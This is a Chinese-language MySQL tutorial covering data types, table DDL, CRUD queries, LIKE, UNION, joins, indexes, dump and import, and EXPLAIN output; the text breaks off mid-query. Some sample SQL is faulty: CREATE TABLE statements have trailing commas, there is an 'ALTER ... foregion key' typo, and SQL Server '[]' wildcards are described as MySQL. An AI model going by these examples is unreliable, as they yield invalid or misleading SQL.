mysql -u root -p
&gt; Enter password: ******

# 退出
mysql&gt; exit



数据库创建# 连接MySQL后，创建
CREATE database 数据库名;

# 建议使用这种方式进行创建数据库
CREATE database if not exists 数据库名 default charset utf8;

# 通过mysqladmin命令直接创建
mysqladmin -u root -p CREATE 数据库名;
Enter password:******


删除# 连接MySQL后，删除
drop database 数据库名;

# 通过mysqladmin命令直接删除
mysqladmin -u root -p drop 数据库名
Enter password:******


选择# 连接MySQL后，选择后需要操作的数据库
mysql&gt; use 数据库名;
Database changed


数据类型后续如果要对数据库做性能优化，了解清楚数据类型是前置条件。
MySQL支持多种类型，大致可以分为三类：数值、日期/时间和字符串(字符)类型。
数值


类型
大小
范围（有符号）
范围（无符号）
用途



TINYINT
1 byte
(-128，127)
(0，255)
小整数值


SMALLINT
2 bytes
(-32 768，32 767)
(0，65 535)
大整数值


MEDIUMINT
3 bytes
(-8 388 608，8 388 607)
(0，16 777 215)
大整数值


INT或INTEGER
4 bytes
(-2 147 483 648，2 147 483 647)
(0，4 294 967 295)
大整数值


BIGINT
8 bytes
(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)
(0，18 446 744 073 709 551 615)
极大整数值


FLOAT
4 bytes
(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)
0，(1.175 494 351 E-38，3.402 823 466 E+38)
单精度 浮点数值


DOUBLE
8 bytes
(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)
0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)
双精度 浮点数值


DECIMAL
对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2
依赖于M和D的值
依赖于M和D的值
小数值


日期和时间每个时间类型有一个有效值范围和一个&quot;零&quot;值，当指定不合法的MySQL不能表示的值时使用&quot;零&quot;值。



类型
大小
范围
格式
用途



DATE
3bytes
1000-01-01/9999-12-31
YYYY-MM-DD
日期值


TIME
3bytes
&#39;-838:59:59&#39;/&#39;838:59:59&#39;
HH:MM:SS
时间值或持续时间


YEAR
1bytes
1901/2155
YYYY
年份值


DATETIME
8bytes
1000-01-01 00:00:00/9999-12-31 23:59:59
YYYY-MM-DD HH:MM:SS
混合日期和时间值


TIMESTAMP
4bytes
1970-01-01 00:00:00/2038结束时间是第 2147483647 秒，北京时间 2038-1-19 11:14:07，格林尼治时间 2038年1月19日 凌晨 03:14:07
YYYYMMDD HHMMSS
混合日期和时间值，时间戳


字符串


类型
大小
用途



CHAR
0 - 255 bytes
定长字符串


VARCHAR
0 - 65535 bytes
变长字符串


TINYBLOB
0 - 255 bytes
不超过 255 个字符的二进制字符串


TINYTEXT
0 - 255 bytes
短文本字符串


BLOB
0 - 65 535 bytes
二进制形式的长文本数据


TEXT
0 - 65 535 bytes
长文本数据


MEDIUMBLOB
0 - 16 777 215 bytes
二进制形式的中等长度文本数据


MEDIUMTEXT
0 - 16 777 215 bytes
中等长度文本数据


LONGBLOB
0 - 4 294 967 295 bytes
二进制形式的极大文本数据


LONGTEXT
0 - 4 294 967 295 bytes
极大文本数据



注意：char(n) 和 varchar(n) 中括号中 n 代表字符的个数，并不代表字节个数，比如 CHAR(30) 就可以存储 30 个字符。

数据表创建DROP TABLE IF EXISTS &#96;t_user_info&#96;;
CREATE TABLE &#96;t_user_info&#96;  (
  &#96;id&#96; bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;主键&#39;,
  &#96;gmt_CREATE&#96; datetime(0) NOT NULL COMMENT &#39;创建时间&#39;,
  &#96;gmt_modified&#96; datetime(0) COMMENT &#39;修改时间&#39;,
  &#96;creator&#96; varchar(32) COMMENT &#39;创建人&#39;,
  &#96;modifier&#96; varchar(32) COMMENT &#39;修改人&#39;,
  &#96;is_deleted&#96; varchar(1) NOT NULL DEFAULT &#39;n&#39; COMMENT &#39;删除标记&#39;,

  PRIMARY KEY (&#96;id&#96;) USING BTREE,
  UNIQUE INDEX &#96;source_case_info&#96;(&#96;channel_source_type&#96;, &#96;channel_source_id&#96;) USING BTREE,
  UNIQUE INDEX &#96;case_summary_key&#96;(&#96;case_summary_key&#96;) USING BTREE,
  INDEX &#96;is_deleted&#96;(&#96;is_deleted&#96;) USING BTREE,
  INDEX &#96;creator&#96;(&#96;creator&#96;) USING BTREE,
  INDEX &#96;gmt_CREATE&#96;(&#96;gmt_CREATE&#96;) USING BTREE,

) ENGINE &#x3D; InnoDB CHARSET &#x3D; utf8 COMMENT &#x3D; &#39;用户基础信息表&#39; ROW_FORMAT &#x3D; DYNAMIC;


如果你不想字段为 NULL 可以设置字段的属性为 NOT NULL， 在操作数据库时如果输入该字段的数据为NULL ，就会报错。
AUTO_INCREMENT定义列为自增的属性，一般用于主键，数值会自动加1。
PRIMARY KEY关键字用于定义列为主键。 您可以使用多列来定义主键，列间以逗号分隔。
ENGINE 设置存储引擎，CHARSET 设置编码。

删除# 删除数据表，表结构和数据都删除，立刻释放磁盘空间
drop table table_name;

# 清空数据表，保留表结构，支持where
# 对于 MyISAM 会立刻释放磁盘空间，InnoDB 不会释放磁盘空间
delete from table_name;

# 带条件的删除，表结构不变，不管是 innodb 还是 MyISAM 都不会释放磁盘空间
# 使用 optimize table table_name 会立刻释放磁盘空间，不管是 innodb 还是 myisam
delete from table_name where xxx &#x3D; xxx;

# 清空数据表，保留表结构，立刻释放磁盘空间
truncate table table_name;


插入-- 基本语法
INSERT INTO table_name ( field1, field2, ..., fieldN )
                       values
                       ( value1, value2, ..., valueN );


如果数据是字符型，必须使用单引号或者双引号，如：&quot;value&quot;。

-- 字段和值要一一对应
INSERT INTO &#96;t_user_info&#96;
(&#96;id&#96;, &#96;gmt_CREATE&#96;, &#96;gmt_modified&#96;, &#96;creator&#96;, &#96;modifier&#96;, &#96;is_deleted&#96;, &#96;phone&#96;, &#96;name&#96;, &#96;role_id&#96;, &#96;role_name&#96;, &#96;company_id&#96;, &#96;company_name&#96;, &#96;dept_id&#96;, &#96;dept_name&#96;, &#96;user_type&#96;, &#96;status&#96;, &#96;is_frozen&#96;, &#96;is_test&#96;, &#96;is_invest_frozen&#96;, &#96;password&#96;, &#96;salt&#96;, &#96;court_id&#96;, &#96;court_name&#96;, &#96;legal_type&#96;) 
VALUES
(525, &#39;2019-04-26 09:46:00&#39;, &#39;2020-06-11 14:06:49&#39;, &#39;system&#39;, &#39;系统管理员&#39;, &#39;n&#39;, 13634184519, &#39;系统管理员&#39;, 0, &#39;管理员&#39;, NULL, NULL, NULL, NULL, &#39;operator&#39;, &#39;normal&#39;, &#39;n&#39;, &#39;n&#39;, &#39;n&#39;, &#39;42f29eb14a981acdce097cef6a45150d&#39;, &#39;j78pqrq9p47kcqu1&#39;, &#39;&#39;, &#39;&#39;, &#39;company&#39;);

-- 插入多条数据
INSERT INTO &#96;t_user_info&#96;
(&#96;gmt_CREATE&#96;, &#96;gmt_modified&#96;, &#96;creator&#96;, &#96;modifier&#96;, &#96;is_deleted&#96;, &#96;phone&#96;, &#96;name&#96;, &#96;role_id&#96;, &#96;role_name&#96;, &#96;company_id&#96;, &#96;company_name&#96;, &#96;dept_id&#96;, &#96;dept_name&#96;, &#96;user_type&#96;, &#96;status&#96;, &#96;is_frozen&#96;, &#96;is_test&#96;, &#96;is_invest_frozen&#96;, &#96;password&#96;, &#96;salt&#96;, &#96;court_id&#96;, &#96;court_name&#96;, &#96;legal_type&#96;) 
VALUES 
(&#39;2019-04-26 09:46:00&#39;, &#39;2020-06-11 14:06:49&#39;, &#39;system&#39;, &#39;系统管理员&#39;, &#39;n&#39;, 13634184519, &#39;系统管理员&#39;, 0, &#39;管理员&#39;, NULL, NULL, NULL, NULL, &#39;operator&#39;, &#39;normal&#39;, &#39;n&#39;, &#39;n&#39;, &#39;n&#39;, &#39;42f29eb14a981acdce097cef6a45150d&#39;, &#39;j78pqrq9p47kcqu1&#39;, NULL, &#39;&#39;, &#39;company&#39;), 
(533, &#39;2019-07-02 19:24:25&#39;, &#39;2020-11-16 17:15:54&#39;, &#39;管理员&#39;, &#39;系统管理员&#39;, &#39;n&#39;, 15155555555, &#39;打工人-张三&#39;, 3, &#39;打工人&#39;, NULL, NULL, 1, &#39;测试部门&#39;, &#39;person&#39;, &#39;normal&#39;, &#39;n&#39;, &#39;n&#39;, &#39;n&#39;, &#39;26d2014872f282ff7e682a5271ffbbed&#39;, &#39;9cpt983corj1n59d&#39;, 298, &#39;测试法院&#39;, &#39;court&#39;);


如果没有提供id，则会自动递增

查询数据-- 基本语法
&lt;SELECT clause&gt; 
[&lt;FROM clause&gt;] 
[&lt;WHERE clause&gt;] 
[&lt;GROUP BY clause&gt;] 
[&lt;HAVING clause&gt;] 
[&lt;ORDER BY clause&gt;] 
[&lt;LIMIT clause&gt;] 

-- 执行顺序
1.  from 
2.  on
3.  join
4.  where 
5.  group by (开始使用select中的别名，后面的语句中都可以使用)
6.  avg, sum等函数
7.  having 
8.  select 
9.  distinct 
10. order by
11. limit 

-- 子句执行顺序
-&gt; 开始 
-&gt; FROM 子句 
-&gt; WHERE 子句 
-&gt; GROUP BY 子句 
-&gt; HAVING 子句 
-&gt; ORDER BY 子句 
-&gt; SELECT 子句 
-&gt; LIMIT 子句
-&gt; 最终结果 


查询语句中你可以使用一个或者多个表，表之间使用逗号(,)分割，并使用WHERE语句来设定查询条件。
SELECT 命令可以读取一条或者多条记录。
你可以使用星号（*）来代替其他字段，SELECT语句会返回表的所有字段数据
你可以使用 WHERE 语句来包含任何条件。
你可以使用 LIMIT 属性来设定返回的记录数。
你可以通过OFFSET指定SELECT语句开始查询的数据偏移量。默认情况下偏移量为0。

where-- 基本语法
[WHERE condition1 [AND [OR]] condition2.....

 -- 操作符
 &#x3D; !&#x3D; &gt; &lt; &gt;&#x3D; &lt;&#x3D;


查询语句中你可以使用一个或者多个表，表之间使用逗号**,** 分割，并使用WHERE语句来设定查询条件。
你可以在 WHERE 子句中指定任何条件。
你可以使用 AND 或者 OR 指定一个或多个条件。
WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。
WHERE 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。

update-- 基本语法
UPDATE table_name SET field1&#x3D;expression1, field2&#x3D;expression2
[WHERE Clause]

-- expression
a &#x3D; 1
a &#x3D; a + 1
a &#x3D; replace(a, &#39;1&#39;, &#39;2&#39;)
a &#x3D; default 设置为默认的值


你可以同时更新一个或多个字段。
你可以在 WHERE 子句中指定任何条件。

delete-- 基本语法
DELETE FROM table_name [WHERE Clause]



如果没有指定 WHERE 子句，MySQL 表中的所有记录将被删除。
你可以在 WHERE 子句中指定任何条件

like
模糊匹配字符串

-- 基本语法
WHERE field1 LIKE condition1 [AND [OR]] filed2 &#x3D; &#39;somevalue&#39;



你可以在 WHERE 子句中使用LIKE子句
你可以使用LIKE子句代替等号 =
LIKE 通常与 % 一同使用，类似于一个元字符的搜索。
你可以在 DELETE 或 UPDATE 命令中使用 WHERE...LIKE 子句来指定条件。

like 与 % _ 结合使用&#39;%a&#39;     &#x2F;&#x2F;以a结尾的数据
&#39;a%&#39;     &#x2F;&#x2F;以a开头的数据
&#39;%a%&#39;    &#x2F;&#x2F;含有a的数据
&#39;_a_&#39;    &#x2F;&#x2F;三位且中间字母是a的
&#39;_a&#39;     &#x2F;&#x2F;两位且结尾字母是a的_
&#39;a_&#39;     &#x2F;&#x2F;两位且开头字母是a的


%：表示任意 0 个或多个字符。可匹配任意类型和长度的字符，有些情况下若是中文，请使用两个百分号（%%）表示。
_：表示任意单个字符。匹配单个任意字符，它常用来限制表达式的字符长度语句。
[]：表示括号内所列字符中的一个（类似正则表达式）。指定一个字符、字符串或范围，要求所匹配对象为它们中的任一个。
[^] ：表示不在括号所列之内的单个字符。其取值和 [] 相同，但它要求所匹配对象为指定字符以外的任一个字符。
查询内容包含通配符时,由于通配符的缘故，导致我们查询特殊字符 “%”、“_”、“[” 的语句无法正常实现，而把特殊字符用 “[ ]” 括起便可正常查询。

union
MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。

-- 基本语法
SELECT expression1, expression2, ... expression_n
FROM tables
[WHERE conditions]
UNION [ALL | DISTINCT]
SELECT expression1, expression2, ... expression_n
FROM tables
[WHERE conditions];


expression1, expression2, ... expression_n: 要检索的列。
tables: 要检索的数据表。
WHERE conditions: 可选， 检索条件。
DISTINCT: 可选，删除结果集中重复的数据。默认情况下 UNION 操作符已经删除了重复数据，所以 DISTINCT 修饰符对结果没啥影响。
ALL: 可选，返回所有结果集，包含重复数据。

mysql&gt; SELECT * FROM Websites;
+----+--------------+---------------------------+-------+---------+
| id | name         | url  | alexa | country |
+----+--------------+---------------------------+-------+---------+
| 1  | baidu       | https:&#x2F;&#x2F;www.baidu.cm&#x2F;    | 1     | USA     |
| 2  | 淘宝          | https:&#x2F;&#x2F;www.taobao.com&#x2F;   | 13    | CN      |
| 3  | 菜鸟教程      | http:&#x2F;&#x2F;www.meteor.com&#x2F;    | 4689  | CN      |
| 4  | 微博          | http:&#x2F;&#x2F;weibo.com&#x2F;         | 20    | CN      |
| 5  | Facebook     | https:&#x2F;&#x2F;www.facebook.com&#x2F; | 3     | USA     |
| 7  | stackoverflow | http:&#x2F;&#x2F;stackoverflow.com&#x2F; |   0 | IND     |
+----+---------------+---------------------------+-------+---------+

mysql&gt; SELECT * FROM apps;
+----+------------+-------------------------+---------+
| id | app_name   | url| country |
+----+------------+-------------------------+---------+
|  1 | QQ APP     | http:&#x2F;&#x2F;im.qq.com&#x2F;       | CN      |
|  2 | 微博 APP    | http:&#x2F;&#x2F;weibo.com&#x2F;       | CN      |
|  3 | 淘宝 APP    | https:&#x2F;&#x2F;www.taobao.com&#x2F; | CN      |
+----+------------+-------------------------+---------+

SELECT country FROM Websites
UNION
SELECT country FROM apps
ORDER BY country;

-- 输出结果如下
+---------+
| country |
+---------+
|	CN	  |
|	IND   |
|	USA   |
+---------+

SELECT country FROM Websites
UNION ALL
SELECT country FROM apps
ORDER BY country;

-- 输出结果如下
+---------+
| country |
+---------+
|	CN	  |
|	CN	  |
|	CN	  |
|	CN	  |
|	CN	  |
|	IND   |
|	USA   |
|	USA   |
|	USA   |
+---------+


注释：UNION 不能用于列出两个表中所有的country。如果一些网站和APP来自同一个国家，每个国家只会列出一次。UNION 只会选取不同的值。请使用 UNION ALL 来选取重复的值！

order by-- 基本语法
ORDER BY field1 [ASC [DESC][默认 ASC]], [field2...] [ASC [DESC][默认 ASC]]



你可以使用任何字段来作为排序的条件，从而返回排序后的查询结果。
你可以设定多个字段来排序。
你可以使用 ASC 或 DESC 关键字来设置查询结果是按升序或降序排列。 默认情况下，它是按升序排列。

group by
GROUP BY 语句根据一个或多个列对结果集进行分组。
在分组的列上我们可以使用 COUNT, SUM, AVG,等函数。

-- 基本语法
GROUP BY column_name;


SELECT coalesce(trial_room_name, &#39;总计&#39;), count(id) 
FROM t_user_info 
WHERE trial_room_name IS NOT NULL
GROUP BY trial_room_name;

-- 输出结果
+-----------------------------+
|trial_room_name | court(id)  |
+-----------------------------+
|	第1办公室	   |  296		|
|	第2办公室	   |  138		|
+------------------------------+

SELECT coalesce(trial_room_name, &#39;总计&#39;), count(id) 
FROM t_user_info 
WHERE trial_room_name IS NOT NULL
GROUP BY trial_room_name WITH ROLLUP;

-- 输出结果 
+-----------------------------+
|trial_room_name | court(id)  |
+-----------------------------+
|	第1办公室	   |  296		|
|	第2办公室	   |  138		|
|	总计          |  434		 |
+------------------------------+


WITH ROLLUP 可以实现在分组统计数据基础上再进行相同的统计（SUM,AVG,COUNT…）。

join
使用 MySQL 的 JOIN 在两个或多个表中查询数据。
你可以在 SELECT, UPDATE 和 DELETE 语句中使用 Mysql 的 JOIN 来联合多表查询。

JOIN 按照功能大致分为如下三类：

INNER JOIN（内连接,或等值连接）：获取两个表中字段匹配关系的记录，a inner join b 可以理解为 a &amp; b。
LEFT JOIN（左连接）：获取左表所有记录，即使右表没有对应匹配的记录，a left join b 可以理解为 a - b。
RIGHT JOIN（右连接）： 与 LEFT JOIN 相反，用于获取右表所有记录，即使左表没有对应匹配的记录，a right join b 可以理解为 b - a。


可以通过 交集 、差集的概念来理解

null值判断
IS NULL: 当列的值是 NULL,此运算符返回 true。
IS NOT NULL: 当列的值不为 NULL, 运算符返回 true。
&lt;=&gt;: 比较操作符（不同于 = 运算符），当比较的的两个值相等或者都为 NULL 时返回 true。


关于 NULL 的条件比较运算是比较特殊的。你不能使用 = NULL 或 != NULL 在列中查找 NULL 值 。

regexp下表中的正则模式可应用于 REGEXP 操作符中。



模式
描述



^
匹配输入字符串的开始位置。如果设置了 RegExp 对象的 Multiline 属性，^ 也匹配 &#39;\n&#39; 或 &#39;\r&#39; 之后的位置。


$
匹配输入字符串的结束位置。如果设置了RegExp 对象的 Multiline 属性，$ 也匹配 &#39;\n&#39; 或 &#39;\r&#39; 之前的位置。


.
匹配除 &quot;\n&quot; 之外的任何单个字符。要匹配包括 &#39;\n&#39; 在内的任何字符，请使用像 &#39;[.\n]&#39; 的模式。


[...]
字符集合。匹配所包含的任意一个字符。例如， &#39;[abc]&#39; 可以匹配 &quot;plain&quot; 中的 &#39;a&#39;。


[^...]
负值字符集合。匹配未包含的任意字符。例如， &#39;[^abc]&#39; 可以匹配 &quot;plain&quot; 中的&#39;p&#39;。


p1|p2|p3
匹配 p1 或 p2 或 p3。例如，&#39;z|food&#39; 能匹配 &quot;z&quot; 或 &quot;food&quot;。&#39;(z|f)ood&#39; 则匹配 &quot;zood&quot; 或 &quot;food&quot;。


*
匹配前面的子表达式零次或多次。例如，zo* 能匹配 &quot;z&quot; 以及 &quot;zoo&quot;。* 等价于{0,}。


+
匹配前面的子表达式一次或多次。例如，&#39;zo+&#39; 能匹配 &quot;zo&quot; 以及 &quot;zoo&quot;，但不能匹配 &quot;z&quot;。+ 等价于 {1,}。


{n}
n 是一个非负整数。匹配确定的 n 次。例如，&#39;o{2}&#39; 不能匹配 &quot;Bob&quot; 中的 &#39;o&#39;，但是能匹配 &quot;food&quot; 中的两个 o。


{n,m}
m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。


查找name字段中以&#39;st&#39;为开头的所有数据：
WHERE name REGEXP &#39;^st&#39;;

查找name字段中以&#39;ok&#39;为结尾的所有数据：
WHERE name REGEXP &#39;ok$&#39;;

查找name字段中包含&#39;mar&#39;字符串的所有数据：
WHERE name REGEXP &#39;mar&#39;;

查找name字段中以元音字符开头或以&#39;ok&#39;字符串结尾的所有数据：
WHERE name REGEXP &#39;^[aeiou]|ok$&#39;;

ALTER
当我们需要修改数据表名或者修改数据表字段时，就需要使用到MySQL ALTER命令。

-- 删除字段
ALTER table table_name drop column_name ;

-- 删除外键
ALTER table table_name drop foregion key keyName;

-- 新增字段
-- 新增字段放至第一列
ALTER table table_name add column_name column_type first;
-- 新增字段放至name字段之后
ALTER table table_name add column_name column_type after name;

-- 修改字段
ALTER table table_name modify column_name new_column_type;
ALTER table table_name change old_column_name new_column_name new_column_type;

-- 修改字段默认值
ALTER table table_name ALTER column_name set default default_value;

-- 删除字段默认值
ALTER table table_name ALTER column_name drop default;

-- 修改数据表配置
ALTER table table_name engine &#x3D; MYISAM;

-- 修改表名
ALTER table table_name rename to new_table_name;


索引MySQL索引的建立对于MySQL的高效运行是很重要的，索引可以大大提高MySQL的检索速度。
打个比方，如果合理的设计且使用索引的MySQL是一辆兰博基尼的话，那么没有设计和使用索引的MySQL就是一个人力三轮车。
拿汉语字典的目录页（索引）打比方，我们可以按拼音、笔画、偏旁部首等排序的目录（索引）快速查找到需要的字。
索引分单列索引和组合索引。单列索引，即一个索引只包含单个列，一个表可以有多个单列索引，但这不是组合索引。组合索引，即一个索引包含多个列。
创建索引时，你需要确保该索引是应用在 SQL 查询语句的条件(一般作为 WHERE 子句的条件)。
实际上，索引也是一张表，该表保存了主键与索引字段，并指向实体表的记录。
上面都在说使用索引的好处，但过多的使用索引将会造成滥用。因此索引也会有它的缺点：虽然索引大大提高了查询速度，同时却会降低更新表的速度，如对表进行INSERT、UPDATE和DELETE。因为更新表时，MySQL不仅要保存数据，还要保存一下索引文件。
建立索引会占用磁盘空间的索引文件。
普通索引
创建索引

CREATE INDEX indexName ON tableName (columnName)


修改表结构，添加索引

ALTER TABLE tableName ADD INDEX indexName(columnName)


创建表时指定索引

-- 基本语法
INDEX [indexName] (username(length)) [USING xxx]

CREATE TABLE &#96;t_user_info&#96;  (

  &#96;id&#96; bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;主键 caseId&#39;,
  &#96;gmt_create&#96; datetime(0) NOT NULL COMMENT &#39;创建时间&#39;,
  &#96;gmt_modified&#96; datetime(0) NULL DEFAULT NULL COMMENT &#39;修改时间&#39;,
  &#96;creator&#96; varchar(32) NULL DEFAULT NULL COMMENT &#39;创建人&#39;,
  &#96;modifier&#96; varchar(32) NULL DEFAULT NULL COMMENT &#39;修改人&#39;,
  &#96;is_deleted&#96; varchar(1) NOT NULL DEFAULT &#39;n&#39; COMMENT &#39;删除标记&#39;,

  PRIMARY KEY (&#96;id&#96;) USING BTREE,

  INDEX &#96;case_code&#96;(&#96;case_code&#96;(255)) USING BTREE,

) ENGINE &#x3D; InnoDB AUTO_INCREMENT &#x3D; 5090 CHARACTER SET &#x3D; utf8mb4 COLLATE &#x3D; utf8mb4_general_ci COMMENT &#x3D; &#39;用户视图表,用于快速查询&#39; ROW_FORMAT &#x3D; DYNAMIC;


删除索引

DROP INDEX indexName ON tableName

唯一索引它与前面的普通索引类似，不同的就是：索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。

创建索引

-- 基本语法
CREATE UNIQUE INDEX indexName ON tableName(columnName(length)) 

-- 栗子
CREATE UNIQUE INDEX &#96;case_summary_key&#96; ON &#96;t_user_info&#96;(&#96;case_summary_key&#96;) 


修改表结构，添加索引

-- 基本语法
ALTER table tableName ADD UNIQUE [indexName] (columnName(length))

-- 栗子
ALTER table &#96;t_user_info&#96; ADD UNIQUE &#96;case_summary_key&#96; (&#96;case_summary_key&#96;)


创建表时指定

CREATE TABLE &#96;t_user_info&#96;  (

  &#96;id&#96; bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;主键 caseId&#39;,

  PRIMARY KEY (&#96;id&#96;) USING BTREE,

  UNIQUE INDEX &#96;source_case_info&#96;(&#96;channel_source_type&#96;, &#96;channel_source_id&#96;) USING BTREE,
  UNIQUE INDEX &#96;case_summary_key&#96;(&#96;case_summary_key&#96;) USING BTREE,

) ENGINE &#x3D; InnoDB COMMENT &#x3D; &#39;用户视图表,用于快速查询&#39;;

添加或删除主键
添加主键

ALTER TABLE tableName ADD PRIMARY KEY (id);


删除主键

ALTER TABLE tableName DROP PRIMARY KEY;

查看索引信息SHOW INDEX FROM tableName;

导出、导入导出# 导出整个数据库
mysqldump -u root -p databaseName &gt; databaseName.sql

# 导出整个表
mysqldump -u root -p databaseName tableName &gt; tableName.sql

# 进入mysql交互环境，通过SELECT ... INTO OUTFILE 命令导出
mysql&gt; SELECT * FROM tableName
    -&gt; INTO OUTFILE &#39;&#x2F;home&#x2F;haigui&#x2F;tableName.sql&#39;;


SELECT ... INTO OUTFILE 语句有以下属性：

LOAD DATA INFILE是SELECT ... INTO OUTFILE的逆操作，SELECT句法。为了将一个数据库的数据写入一个文件，使用SELECT ... INTO OUTFILE，为了将文件读回数据库，使用LOAD DATA INFILE。
SELECT...INTO OUTFILE &#39;file_name&#39;形式的SELECT可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。
输出不能是一个已存在的文件。防止文件数据被篡改。
你需要有一个登陆服务器的账号来检索文件。否则 SELECT ... INTO OUTFILE 不会起任何作用。
在UNIX中，该文件被创建后是可读的，权限由MySQL服务器所拥有。这意味着，虽然你就可以读取该文件，但可能无法将其删除。

导入# 导入整个数据库
mysql -u root -p password &lt; meteor.sql

# 导入数据表
mysqlimport -u root -p --local tableName dump.txt
Enter password: ******

# 进入mysql交互环境，通过source命令导入
mysql&gt; create database test;
mysql&gt; use test;
mysql&gt; set names utf8;
mysql&gt; source &#x2F;home&#x2F;haigui&#x2F;meteor.sql;

# 插入数据到表
mysql&gt; LOAD DATA LOCAL INFILE &#39;dump.txt&#39; INTO TABLE tableName;


msyqlimport常用参数



选项
功能



-d or --delete
新数据导入数据表中之前删除数据数据表中的所有信息


-f or --force
不管是否遇到错误，mysqlimport将强制继续插入数据


-i or --ignore
mysqlimport跳过或者忽略那些有相同唯一 关键字的行， 导入文件中的数据将被忽略。


-l or -lock-tables
数据被插入之前锁住表，这样就防止了， 你在更新数据库时，用户的查询和更新受到影响。


-r or -replace
这个选项与－i选项的作用相反；此选项将替代 表中有相同唯一关键字的记录。


--fields-enclosed- by= char
指定文本文件中数据的记录时以什么括起的， 很多情况下 数据以双引号括起。 默认的情况下数据是没有被字符括起的。


--fields-terminated- by=char
指定各个数据的值之间的分隔符，在句号分隔的文件中， 分隔符是句号。您可以用此选项指定数据之间的分隔符。 默认的分隔符是跳格符（Tab）


--lines-terminated- by=str
此选项指定文本文件中行与行之间数据的分隔字符串 或者字符。 默认的情况下mysqlimport以newline为行分隔符。 您可以选择用一个字符串来替代一个单个的字符： 一个新行或者一个回车。


explainEXPLAIN SELECT * FROM t_user_info WHERE case_code &#x3D; &#39;1111&#39; or id &#x3D; 2020

-- 输出结果如下表




id
select_type
table
type
possible_keys
key
key_len
ref
rows
filtered
Extra



1
SIMPLE
t_user_info
index_merge
PRIMARY,case_code
case_code,PRIMARY
768,8

2
100.00
Using sort_union(case_code,PRIMARY); Using where


字段含义
官方文档https://dev.mysql.com/doc/refman/5.7/en/explain-output.html#explain-output-columns




列名
含义



id
SELECT识别符。这是SELECT的查询序列号


select_type
SELECT类型，可以为以下任何一种：SIMPLE：简单SELECT(不使用UNION或子查询)PRIMARY：最外面的SELECTUNION：UNION中的第二个或后面的SELECT语句DEPENDENT UNION：UNION中的第二个或后面的SELECT语句，取决于外面的查询UNION RESULT：UNION 的结果SUBQUERY：子查询中的第一个SELECTDEPENDENT SUBQUERY：子查询中的第一个SELECT，取决于外面的查询DERIVED：导出表的SELECT(FROM子句的子查询)


table
输出的行所引用的表


type
联接类型。下面给出各种联接类型，按照从最佳类型到最坏类型进行排序：system：表仅有一行(=系统表)。这是const联接类型的一个特例。const：表最多有一个匹配行，它将在查询开始时被读取。因为仅有一行，在这行的列值可被优化器剩余部分认为是常数。const表很快，因为它们只读取一次!eq_ref：对于每个来自于前面的表的行组合，从该表中读取一行。这可能是最好的联接类型，除了const类型。ref：对于每个来自于前面的表的行组合，所有有匹配索引值的行将从这张表中读取。ref_or_null：该联接类型如同ref，但是添加了MySQL可以专门搜索包含NULL值的行。index_merge：该联接类型表示使用了索引合并优化方法。unique_subquery：该类型替换了下面形式的IN子查询的ref： value IN (SELECT primary_key FROM single_table WHERE some_expr) unique_subquery是一个索引查找函数，可以完全替换子查询，效率更高。index_subquery：该联接类型类似于unique_subquery。可以替换IN子查询，但只适合下列形式的子查询中的非唯一索引：value IN (SELECT key_column FROM single_table WHERE some_expr)range：只检索给定范围的行，使用一个索引来选择行。index：该联接类型与ALL相同，除了只有索引树被扫描。这通常比ALL快，因为索引文件通常比数据文件小。ALL：对于每个来自于先前的表的行组合，进行完整的表扫描。


possible_keys
指出MySQL能使用哪个索引在该表中找到行


key
显示MySQL实际决定使用的键(索引)。如果没有选择索引，键是NULL。


key_len
显示MySQL决定使用的键长度。如果键是NULL，则长度为NULL。


ref
显示使用哪个列或常数与key一起从表中选择行。


rows
显示MySQL认为它执行查询时必须检查的行数。多行之间的数据相乘可以估算要处理的行数。


filtered
显示了通过条件过滤出的行数的百分比估计值。


Extra
该列包含MySQL解决查询的详细信息Distinct：MySQL发现第1个匹配行后，停止为当前的行组合搜索更多的行。Not exists：MySQL能够对查询进行LEFT JOIN优化，发现1个匹配LEFT JOIN标准的行后，不再为前面的的行组合在该表内检查更多的行。**range checked for each record (index map： #)**：MySQL没有发现好的可以使用的索引，但发现如果来自前面的表的列值已知，可能部分索引可以使用。Using filesort：MySQL需要额外的一次传递，以找出如何按排序顺序检索行。Using index：从只使用索引树中的信息而不需要进一步搜索读取实际的行来检索表中的列信息。Using temporary：为了解决查询，MySQL需要创建一个临时表来容纳结果。Using where：WHERE 子句用于限制哪一个行匹配下一个表或发送到客户。**Using sort_union(...)， Using union(...)， Using intersect(...)**：这些函数说明如何为index_merge联接类型合并索引扫描。Using index for group-by：类似于访问表的Using index方式，Using index for group-by表示MySQL发现了一个索引，可以用来查 询GROUP BY或DISTINCT查询的所有列，而不要额外搜索硬盘访问实际的表。


select_typeunion
当通过union来连接多个查询结果时，第二个之后的select其select_type为UNION

EXPLAIN 

SELECT * FROM t_user_info WHERE id &#x3D; 1161 
UNION
SELECT * FROM t_user_info WHERE id &#x3D; 1166




id
select_type
table
type
possible_keys
key
key_len
ref
rows
filtered
Extra



1
PRIMARY
t_user_info
const
PRIMARY
PRIMARY
8
const
1
100.00
NULL


2
UNION
t_user_info
const
PRIMARY
PRIMARY
8
const
1
100.00
NULL


NULL
UNION RESULT
&lt;union1,2&gt;
ALL
NULL
NULL
NULL
NULL
NULL
NULL
Using temporary


DEPENDENT UNION 与 DEPENDENT SUBQUERY
当union作为子查询时，其中第一个子查询的select_type则是DEPENDENT SUBQUERY，第二个union的select_type就是DEPENDENT UNION。

EXPLAIN 

SELECT * FROM t_user_info WHERE id IN (
	SELECT id FROM t_user_info WHERE id &#x3D; 1161
	UNION
